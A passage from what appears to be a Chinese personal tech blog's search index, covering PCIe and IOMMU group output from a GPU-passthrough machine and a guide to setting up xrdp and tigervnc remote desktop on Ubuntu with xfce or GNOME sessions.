 +-08.0-[06]----00.0  Intel Corporation Wi-Fi 6 AX200\n           |                               \\-09.0-[07]----00.0  Realtek Semiconductor Co., Ltd. RTL8125 2.5GbE Controller\n           +-02.0  Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge\n           +-03.0  Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge\n           +-03.1-[08]--+-00.0  NVIDIA Corporation GP106 [GeForce GTX 1060 3GB]\n           |            \\-00.1  NVIDIA Corporation GP106 High Definition Audio Controller\n           +-04.0  Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge\n           +-05.0  Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge\n           +-07.0  Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge\n           +-07.1-[09]----00.0  Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Function\n           +-08.0  Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge\n           +-08.1-[0a]--+-00.0  Advanced Micro Devices, Inc. [AMD] Starship/Matisse Reserved SPP\n           |            +-00.1  Advanced Micro Devices, Inc. [AMD] Starship/Matisse Cryptographic Coprocessor PSPCPP\n           |            +-00.3  Advanced Micro Devices, Inc. [AMD] Matisse USB 3.0 Host Controller\n           |            \\-00.4  Advanced Micro Devices, Inc. [AMD] Starship/Matisse HD Audio Controller\n           +-14.0  Advanced Micro Devices, Inc. [AMD] FCH SMBus Controller\n           +-14.3  Advanced Micro Devices, Inc. [AMD] FCH LPC Bridge\n           +-18.0  Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 0\n           +-18.1  Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 1\n           +-18.2  Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 2\n           +-18.3  Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 3\n           +-18.4  Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 4\n           +-18.5  Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 5\n           +-18.6  Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 6\n           \\-18.7  Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 7\n</code></pre> <pre><code>\u279c  ~ sudo dmesg | grep -i acs\n[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-5.19.17 root=UUID=5d812412-e8a8-47c5-9dc0-505a28fc0eb9 ro quiet splash amd_iommu=on kvm.ignore_msrs=1 vfio_pci.ids=10de:1c02,10de:10f1 pcie_acs_override=multifunction vt.handoff=7\n[    0.000000] Warning: PCIe ACS overrides enabled; This may allow non-IOMMU protected peer-to-peer DMA\n[    0.004417] ACPI: FACS 0x00000000AAEDA000 000040\n[    0.004452] ACPI: Reserving FACS table memory at [mem 0xaaeda000-0xaaeda03f]\n[    0.074290] Kernel command line: BOOT_IMAGE=/boot/vmlinuz-5.19.17 root=UUID=5d812412-e8a8-47c5-9dc0-505a28fc0eb9 ro quiet splash amd_iommu=on kvm.ignore_msrs=1 vfio_pci.ids=10de:1c02,10de:10f1 pcie_acs_override=multifunction vt.handoff=7\n</code></pre> <pre><code>\u279c  scripts ./iommu-viewer.sh\nPlease be patient. This may take a couple seconds.\nGroup:  0   0000:00:01.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  1   0000:00:01.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse GPP Bridge [1022:1483]   Driver: pcieport\nGroup:  2   0000:00:01.2 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse GPP Bridge [1022:1483]   Driver: pcieport\nGroup:  3   0000:00:02.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  4   0000:00:03.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  5   0000:00:03.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse GPP Bridge [1022:1483]   Driver: pcieport\nGroup:  6   0000:00:04.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  7   0000:00:05.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  8   0000:00:07.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  9   0000:00:07.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Internal PCIe GPP Bridge 0 to bus[E:B] [1022:1484]   Driver: pcieport\nGroup:  10  0000:00:08.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge [1022:1482]\nGroup:  11  0000:00:08.1 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Internal PCIe GPP Bridge 0 to bus[E:B] [1022:1484]   Driver: pcieport\nGroup:  12  0000:00:14.0 SMBus [0c05]: Advanced Micro Devices, Inc. [AMD] FCH SMBus Controller [1022:790b] (rev 61)   Driver: piix4_smbus\nGroup:  12  0000:00:14.3 ISA bridge [0601]: Advanced Micro Devices, Inc. [AMD] FCH LPC Bridge [1022:790e] (rev 51)\nGroup:  13  0000:00:18.0 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 0 [1022:1440]\nGroup:  13  0000:00:18.1 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 1 [1022:1441]\nGroup:  13  0000:00:18.2 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 2 [1022:1442]\nGroup:  13  0000:00:18.3 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 3 [1022:1443]   Driver: k10temp\nGroup:  13  0000:00:18.4 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 4 [1022:1444]\nGroup:  13  0000:00:18.5 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 5 [1022:1445]\nGroup:  13  0000:00:18.6 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 6 [1022:1446]\nGroup:  13  0000:00:18.7 Host bridge [0600]: Advanced Micro Devices, Inc. [AMD] Matisse/Vermeer Data Fabric: Device 18h; Function 7 [1022:1447]\nGroup:  14  0000:01:00.0 Non-Volatile memory controller [0108]: Samsung Electronics Co Ltd NVMe SSD Controller PM9A1/PM9A3/980PRO [144d:a80a]   Driver: nvme\nGroup:  15  0000:02:00.0 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD] 500 Series Chipset USB 3.1 XHCI Controller [1022:43ee]   Driver: xhci_hcd\nGroup:  16  0000:02:00.1 SATA controller [0106]: Advanced Micro Devices, Inc. [AMD] 500 Series Chipset SATA Controller [1022:43eb]   Driver: ahci\nGroup:  17  0000:02:00.2 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] 500 Series Chipset Switch Upstream Port [1022:43e9]   Driver: pcieport\nGroup:  18  0000:03:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  18  0000:04:00.0 VGA compatible controller [0300]: Advanced Micro Devices, Inc. [AMD/ATI] Baffin [Radeon RX 550 640SP / RX 560/560X] [1002:67ff] (rev ff)   Driver: amdgpu\nGroup:  18  0000:04:00.1 Audio device [0403]: Advanced Micro Devices, Inc. [AMD/ATI] Baffin HDMI/DP Audio [Radeon RX 550 640SP / RX 560/560X] [1002:aae0]   Driver: snd_hda_intel\nGroup:  19  0000:03:04.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  19  0000:05:00.0 Non-Volatile memory controller [0108]: KIOXIA Corporation NVMe SSD [1e0f:0009] (rev 01)   Driver: nvme\nGroup:  20  0000:03:08.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  20  0000:06:00.0 Network controller [0280]: Intel Corporation Wi-Fi 6 AX200 [8086:2723] (rev 1a)   Driver: iwlwifi\nGroup:  21  0000:03:09.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD] Device [1022:43ea]   Driver: pcieport\nGroup:  21  0000:07:00.0 Ethernet controller [0200]: Realtek Semiconductor Co., Ltd. RTL8125 2.5GbE Controller [10ec:8125] (rev 05)   Driver: r8169\nGroup:  22  0000:08:00.0 VGA compatible controller [0300]: NVIDIA Corporation GP106 [GeForce GTX 1060 3GB] [10de:1c02] (rev a1)   Driver: vfio-pci\nGroup:  23  0000:08:00.1 Audio device [0403]: NVIDIA Corporation GP106 High Definition Audio Controller [10de:10f1] (rev a1)   Driver: vfio-pci\nGroup:  24  0000:09:00.0 Non-Essential Instrumentation [1300]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Function [1022:148a]\nGroup:  25  0000:0a:00.0 Non-Essential Instrumentation [1300]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Reserved SPP [1022:1485]\nGroup:  26  0000:0a:00.1 Encryption controller [1080]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse Cryptographic Coprocessor PSPCPP [1022:1486]   Driver: ccp\nGroup:  27  0000:0a:00.3 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD] Matisse USB 3.0 Host Controller [1022:149c]   Driver: xhci_hcd\nGroup:  28  0000:0a:00.4 Audio device [0403]: Advanced Micro Devices, Inc. [AMD] Starship/Matisse HD Audio Controller [1022:1487]   Driver: snd_hda_intel\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/","title":"vnc\u548crdp\u8fdc\u7a0b","text":"","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u5199\u8fd9\u4e2a\u7684\u539f\u56e0\u662f\uff0c\u7f51\u7edc\u4e0a\u7684\u6559\u7a0b\u771f\u7684\u592a\u70c2\u4e86\u3002\u6bd4\u5982\uff1a</p> <ul> <li>\u6ca1\u6709\u8bf4\u660e\u5c31\u9ed8\u8ba4\u7528centos</li> <li>\u9ed8\u8ba4\u662f\u670d\u52a1\u5668\u7248\u672c\u7684Linux\u53d1\u884c\u7248\uff0c\u6ca1\u6709\u684c\u9762\u73af\u5883</li> <li>\u684c\u9762\u73af\u5883\u9ed8\u8ba4\u7528xfce\uff0c\u800c\u5f88\u5c11\u6709gnome\u7684</li> <li>vnc\u5404\u79cd\u7248\u672c\uff0c\u9ed8\u8ba4\u53ea\u8bf4\u660e\u5176\u4e2d\u4e00\u79cd</li> <li>xstartup\u6ca1\u6709\u4efb\u4f55\u8bf4\u660e\uff0c\u5982\u4f55\u914d\u7f6e</li> </ul> <p>\u5404\u79cdremote desktop\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u770b\u5230\u6700\u8fd1\u66f4\u65b0\u65f6\u95f4</p> <ul> <li>Comparison of remote desktop software - Wikipedia</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#rdp","title":"RDP","text":"<p>RDP\u662fWindows\u8fdc\u7a0b\u684c\u9762\u4f7f\u7528\u7684\u4e00\u79cd\u4e13\u5229\u534f\u8bae\u3002</p> <p>Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection.[1] The user employs RDP client software for this purpose, while the other computer must run RDP server software.Clients exist for most versions of Microsoft Windows (including Windows Mobile), Linux, Unix, macOS, iOS, Android, and other operating systems. RDP servers are built into Windows operating systems; an RDP server for Unix and OS X also exists. By default, the server listens on TCP port 3389[2] and UDP port 3389.[3]</p> <p>\u4f46\u662f\u4e0d\u77e5\u600e\u4e48\u505a\u5230\u7684\uff0clinux\u4e0b\u4e5f\u6709rdp server\u7684\u5f00\u6e90\u5b9e\u73b0\u2014\u2014xrdp</p> <p>neutrinolabs/xrdp: xrdp: an open source RDP server (github.com)</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<ul> <li> <p>\u5bf9\u4e8e\u670d\u52a1\u5668linux\u9700\u8981\u5b89\u88c5\u684c\u9762\u73af\u5883\uff0c\u5982xfce\uff0cGnome\uff08\u4e0d\u77e5\u4e3a\u4f55\u7f51\u4e0a\u641c\u7d22\u6559\u7a0b\u5168\u90e8\u90fd\u9ed8\u8ba4\u4f60\u6ca1\u6709\u684c\u9762\u73af\u5883\uff0c\u5e76\u4e14\u90fd\u53eb\u4f60\u5b89\u88c5xfce\uff0c\u611f\u89c9\u5f88\u5947\u602a\uff09</p> </li> <li> <p>\u5b89\u88c5\u53ea\u9700\u8981\u4e00\u884c\u547d\u4ee4</p> </li> </ul> <pre><code>sudo apt install xrdp\n</code></pre> <ul> <li>\u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7systemctl\u770b\u5230\u670d\u52a1\u6b63\u5728\u8fd0\u884c\u4e86</li> </ul> <pre><code>sudo systemctl status xrdp\n</code></pre> <p>xrdp\u76d1\u542c\u7684\u7aef\u53e3\u548cwindows\u4e00\u6837\u4e5f\u662f3389\uff0c\u9700\u8981\u6253\u5f00\u9632\u706b\u5899\u3002</p> <ul> <li>\u7136\u540e\u4fbf\u53ef\u4ee5\u901a\u8fc7RDP\u5ba2\u6237\u7aef\u8fde\u63a5\u4f7f\u7528\u4e86</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u95ee\u9898","title":"\u95ee\u9898","text":"<ul> <li> <p>\u663e\u793a\u9ed1\u5c4f\uff1axrdp\u53ea\u652f\u6301\u540c\u4e00\u4e2a\u7528\u6237\u767b\u5f55\u4e00\u4e2a\u684c\u9762\u3002\u56e0\u6b64\u9700\u8981\u628a\u5176\u4ed6\u767b\u5f55\u4e86\u684c\u9762\u7684\u7528\u6237\u9000\u51fa\u3002</p> </li> <li> <p>\u663e\u793a\u5361\u987f\uff1a\u7f51\u4e0a\u6709\u7c7b\u4f3c\u95ee\u9898\uff0c\u4f46\u662f\u8fd8\u4e0d\u77e5\u5982\u4f55\u89e3\u51b3</p> </li> <li>\u540c\u6837\u6709\u4efb\u52a1\u680f(dock)\u4e0d\u663e\u793a\u95ee\u9898</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#rdp-client","title":"RDP client","text":"<p>Remote Desktop Protocol - Wikipedia #Non-Microsoft implementations</p> <ul> <li> <p>mstsc.exe\u7684\u5168\u540d\u662f (microsoft terminal service client)</p> </li> <li> <p>rdesktop -&gt; FreeRDP -&gt; Remmina</p> </li> <li>rdesktop\u5f88\u8001</li> <li>\u547d\u4ee4\u884c\u7528FreeRDP </li> <li> <p>GUI\u7528Remmina\uff08\u57fa\u4e8eFreeRDP\uff09</p> </li> <li> <p>server</p> </li> <li>xrdp</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#vnc","title":"VNC","text":"<p>VNC\u5219\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u534f\u8bae\u7528\u4e8e\u8fdc\u7a0b\u63a7\u5236\u8ba1\u7b97\u673a</p> <p>In computing, Virtual Network Computing (VNC) is a graphical desktop-sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse input from one computer to another, relaying the graphical-screen updates, over a network.[1]</p> <p>linux\u4e0b\u6709\u597d\u591a\u4e0d\u540c\u7684vncserver\uff0c\u5982tightvnc, tigervnc, ultravnc\u7b49\uff0c\u4e0d\u540cvncserver\u7684\u547d\u4ee4\u4e0d\u540c\uff0c\u914d\u7f6e\u6587\u4ef6\u4e0d\u540c\uff0c\u7f51\u4e0a\u6559\u7a0b\u6bd4\u8f83\u6742\u4e71\u3002\u8fd9\u91cc\u4ee5tigervnc\u4e3a\u8bf4\u660e\u3002</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#tigervnc-ubuntu2004","title":"tigervnc ubuntu20.04","text":"<pre><code>sudo apt install tigervnc-standalone-server\n\nvncserver -localhost no :1\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#xfce4","title":"xfce4","text":"<p>vncserver 1.7 failed command /etc/X11/Xvnc-session Debian Stretch (google.com)</p> <pre><code>vncserver -localhost no :1 -xstartup ~/.vnc/xstartup-xfce4\n</code></pre> <p>xstartup-xfce4 <pre><code>#! /bin/sh  \n\ntest x\"$SHELL\" = x\"\" &amp;&amp; SHELL=/bin/bash  \ntest x\"$1\"\u00a0\u00a0\u00a0\u00a0 = x\"\" &amp;&amp; set -- default  \n\nvncconfig -iconic &amp;  \n$SHELL -l &lt;&lt;EOF\n\n\nxterm -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;  \n\nDESKTOP_SESSION=xfce  \nexport DESKTOP_SESSION  \nstartxfce4\n</code></pre></p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"<p>20.04 - Can't open terminal through tightvncserver on Ubuntu 20 / no gnome panel - Ask Ubuntu vnc\u70b9\u51fbterminal\u65e0\u6cd5\u5e94 \u539f\u56e0\uff1a - \u5bf9\u4e8exfce\u70b9\u51fbterminal\uff0c\u9ed8\u8ba4\u6253\u5f00\u00a0x-terminal-emulator\uff0c\u800c\u5b83\u94fe\u63a5\u5230gnome-terminal warpper\u3002   - You can get this info from Applications-&gt;File Manager-&gt;Edit-&gt;Configure custom actions..., and Applications-&gt;Settings-&gt;Settings Manager-&gt;Preferred Applications-&gt;Utilities, also to trace the symlink of x-terminal-emulator. - \u5361\u4f4f\u662f\u56e0\u4e3a\u5728\u5c1d\u8bd5\u8fde\u63a5d-bus\u3002The thing is that gnome-terminal is trying to connect to D-Bus but failed to get a response and timed out, to verify it you could launch D-Bus first, e.g.\u00a0<code>$ dbus-launch gnome-terminal</code>\u00a0and you will see a gnome terminal pops up. - \u6700\u7b80\u5355\u7684\u65b9\u5f0f\u662f\u6362\u4e00\u4e2aterminal\u3002\u5982Applications-&gt;System-&gt;Xfce Terminal\u3002\u6216\u8005<code>sudo update-alternatives --config x-terminal-emulator</code>\u4fee\u6539\u9ed8\u8ba4\u7684terminal\u3002\u53ef\u4ee5\u9009\u62e9xfce4-terminal\u6216\u8005xterm - \u5982\u679c\u60f3\u8981\u4f7f\u7528gnome-terminal\u3002\u5c06\u4ee5\u4e0b\u4ee3\u7801\u63d2\u5165xstartup\u4e2dstartxfce4\u4e4b\u524d\u5373\u53ef   <pre><code>xrdb $HOME/.Xresources \nxsetroot -solid grey\n\nexport XKL_XMODMAP_DISABLE=1 \nexport XDG_CURRENT_DESKTOP=\"GNOME-Flashback:Unity\" \nexport XDG_MENU_PREFIX=\"gnome-flashback-\"\n\nunset DBUS_SESSION_BUS_ADDRESS\n\ngnome-session --session=gnome-flashback-metacity --disable-acceleration-check &amp;\n</code></pre></p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#tigervnc","title":"tigervnc","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li>VNC/Servers - Community Help Wiki (ubuntu.com)</li> <li>VNC\u7684\u5b89\u88c5\u4e0e\u4f7f\u7528 - SYAO</li> <li>\u6ce8\u610f\u8be5\u6559\u7a0b\u9488\u5bf91.11\u7248\u672c\uff0c1.12\u4e2d\u914d\u7f6e\u6587\u4ef6\uff0csystemd service\u540d\u79f0\u6539\u53d8\u4e86\u3002</li> <li>TigerVNC/tigervnc: High performance, multi-platform VNC client and server (github.com)</li> <li>readme\u4e2d\u7684\u5173\u4e8eXvnc,vncserver@.service\u4ecb\u7ecd\u5df2\u7ecf\u8fc7\u65f6\u4e86\uff08\u540d\u5b57\u53d8\u5316\u4e86\uff09</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u4f7f\u7528\u60c5\u51b5","title":"\u4f7f\u7528\u60c5\u51b5","text":"<ul> <li>\u53f0\u5f0f\u673a\u79bb\u5f00\u4e0d\u7528\u65f6\uff0c\u70b9\u51fb\u6ce8\u9500\uff0cwin+L\u9501\u5c4f\u662f\u4e0d\u591f\u7684\u3002\u6ce8\u9500\u540e\uff0c\u67e5\u770b\u8fd0\u884c\u7684Xserver\u4f1a\u53d1\u73b0\u4eceX1\u53d8\u6210\u4e86X0\u3002</li> <li>vnc\u8fdc\u7a0b\u4e0d\u518d\u4f7f\u7528\u540e\uff0c\u53ef\u4ee5systemctl stop\u6389\u670d\u52a1\uff0c\u4e5f\u53ef\u4ee5\u70b9\u51fb\u6ce8\u9500\u3002\u6b64\u65f6vnc\u7684Xserver\u4e5f\u4f1a\u5173\u95ed\u3002</li> </ul>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u684c\u9762\u73af\u5883","title":"\u684c\u9762\u73af\u5883","text":"<p>\u9700\u8981\u6709\u4e00\u4e2a\u684c\u9762\u73af\u5883(desktop environment)</p> <p>ubuntu desktop\u7248\u4f7f\u7528\u81ea\u5e26\u7684GNOME\u684c\u9762\u5373\u53ef\uff0c\u6216\u8005\u53c2\u8003\u5982\u4f55\u5b89\u88c5\u4e0d\u540c\u684c\u9762\u73af\u5883\uff0c\u5982xfce\uff1aHow to Install and Use Another Desktop Environment on Linux (howtogeek.com)</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u5b89\u88c5tigervnc","title":"\u5b89\u88c5tigervnc","text":"<ul> <li>apt\u641c\u7d22tigervnc\u6709\u5f88\u591a\u5305\uff0c\u9700\u8981\u786e\u5b9a\u54ea\u4e2a\u5305\u5305\u542bvnc server</li> </ul> <pre><code>~ apt search tigervnc\n\ntigervnc-common/jammy,now 1.12.0+dfsg-4 amd64 [\u5df2\u5b89\u88c5\uff0c\u81ea\u52a8]\n  Virtual network computing; Common software needed by servers\n\ntigervnc-scraping-server/jammy 1.12.0+dfsg-4 amd64\n  Virtual network computing server performing X screen scraping\n\ntigervnc-standalone-server/jammy,now 1.12.0+dfsg-4 amd64 [\u5df2\u5b89\u88c5]\n  Standalone virtual network computing server\n\ntigervnc-tools/jammy,now 1.12.0+dfsg-4 amd64 [\u5df2\u5b89\u88c5\uff0c\u81ea\u52a8]\n  Virtual network computing; Tools for both clients and servers\n\ntigervnc-viewer/jammy 1.12.0+dfsg-4 amd64\n  Virtual network computing client for X\n\ntigervnc-xorg-extension/jammy 1.12.0+dfsg-4 amd64\n  Virtual network computing X server extension\n</code></pre> <ul> <li>\u53ef\u4ee5\u5728Ubuntu \u2013 Ubuntu Packages Search\u641c\u7d22\uff0c\u67e5\u770b\u5305\u91cc\u9762\u5305\u542b\u54ea\u4e9b\u5185\u5bb9\u3002\u6bd4\u5982tigervnc-standalone-server</li> </ul> <p>https://packages.ubuntu.com/jammy/amd64/tigervnc-standalone-server/filelist</p> <pre><code>/etc/X11/Xtigervnc-session\n/etc/tigervnc/vncserver.users\n/lib/systemd/system/tigervncserver@.service\n/usr/bin/Xtigervnc\n/usr/bin/tigervncserver\n/usr/libexec/tigervncsession-start\n/usr/sbin/tigervncsession\n/usr/share/doc/tigervnc-standalone-server/changelog.Debian.gz\n/usr/share/doc/tigervnc-standalone-server/copyright\n/usr/share/man/man1/Xtigervnc.1.gz\n/usr/share/man/man1/tigervncserver.1.gz\n/usr/share/man/man8/tigervncsession.8.gz\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u5305\u542b<code>/usr/bin/tigervncserver</code>\uff0c\u5373\u4e3a\u6211\u4eec\u9700\u8981\u7684\u3002\u540c\u65f6\u8fd8\u5305\u542b\u4e00\u4e2asystemd\u670d\u52a1\u6a21\u677f\u2014\u2014<code>/lib/systemd/system/tigervncserver@.service</code>\uff0c\u8bf4\u660e\u53ef\u4ee5\u4f7f\u7528systemd\u542f\u52a8vnc server</p> <ul> <li>\u5b89\u88c5</li> </ul> <pre><code>sudo apt install tigervnc-standalone-server\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u8fde\u63a5\u5bc6\u7801","title":"\u8fde\u63a5\u5bc6\u7801","text":"<p>\u5176\u5b83vncserver\uff0c\u7b2c\u4e00\u6b21\u8fd0\u884c\u65f6\u4f1a\u8ba9\u7528\u6237\u8bbe\u7f6e\u5bc6\u7801\uff0c\u5982</p> <pre><code>vncserver -localhost no #\u8bbe\u7f6e\u4e3ano localhost\uff0c\u4e0d\u7136\u53ea\u80fd\u5728\u672c\u8ba1\u7b97\u673a\u4e0a\u8bbf\u95ee\uff08LAN\u5185\u7684\u90fd\u4e0d\u884c\uff09\u3002\n</code></pre> <p>tigervnc 1.10\u540e\u867d\u7136\u4e0d\u5e94\u4f7f\u7528vncserver\u6765\u542f\u52a8\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8be5\u65b9\u5f0f\u8bbe\u7f6e\u5bc6\u7801\u3002</p> <p>\u521b\u5efa\u5bc6\u7801\u540e\uff0c\u4f1a\u751f\u6210~/.vnc/passwd\u6587\u4ef6\u3002</p>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u914d\u7f6evncserver","title":"\u914d\u7f6evncserver","text":"<p>\u6211\u4eec\u9700\u8981\u914d\u7f6e$HOME/.vnc/tigervnc.conf\uff0c\u793a\u4f8b\u914d\u7f6e\u5982\u4e0b\uff0c\u5176\u4e2d\u53ea\u6709session\u662f\u5fc5\u987b\u7684\uff0c\u5bf9\u5e94<code>/usr/share/xsessions</code>\u76ee\u5f55\u4e0b\u7684\u4e00\u4e2a\u684c\u9762\u73af\u5883\u3002</p> <pre><code>$session=ubuntu;\n$geometry = \"1920x1080\";\n$localhost = \"no\";\n#$depth = \"24\";\n#$pixelformat = \"rgb888\";\n$SecurityTypes = \"VncAuth,TLSVnc\";\n</code></pre>","tags":["vnc","rdp","tigervnc","x11vnc","noVNC","X11"]},{"location":"%E5%8D%9A%E5%AE%A2/2022/07/19/2022-07-19-vnc%E5%92%8Crdp%E8%BF%9C%E7%A8%8B/#\u914d\u7f6e\u7684\u8bf4\u660e","title":"\u914d\u7f6e\u7684\u8bf4\u660e","text":"<ul> <li>\u67e5\u770bman tigervnc.conf(5x)</li> <li>\u67e5\u770b<code>/etc/tigervnc/vncserver-config-defaults</code></li> <li>\u53ef\u67e5\u770b<code>/lib/systemd/system/tigervncserver@.service</code>\u6ce8\u91ca\u8bf4\u660e</li> </ul> <p>\u67e5\u770b<code>man 